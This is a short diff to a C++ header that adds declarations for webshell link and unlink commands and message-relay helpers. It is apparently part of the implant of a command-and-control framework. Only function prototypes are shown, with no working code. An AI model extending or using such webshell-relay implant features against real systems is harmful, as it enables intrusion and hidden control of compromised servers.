@@ -369,6 +369,20 @@ namespace starburst {
     auto declfn cmd_lldp_disconnect( instance& inst, char* task_uuid, Parser* params ) -> void;
 #endif
 
+#ifdef INCLUDE_CMD_LINK_WEBSHELL
+    auto declfn cmd_link_webshell( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_UNLINK_WEBSHELL
+    auto declfn cmd_unlink_webshell( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )
+    auto declfn ws_poll_links( instance& inst ) -> void;
+    auto declfn ws_link_send_msg( instance& inst, instance::WebshellLink* link,
+                                   uint8_t* data, uint32_t len ) -> bool;
+#endif
+
 }
 
 #endif
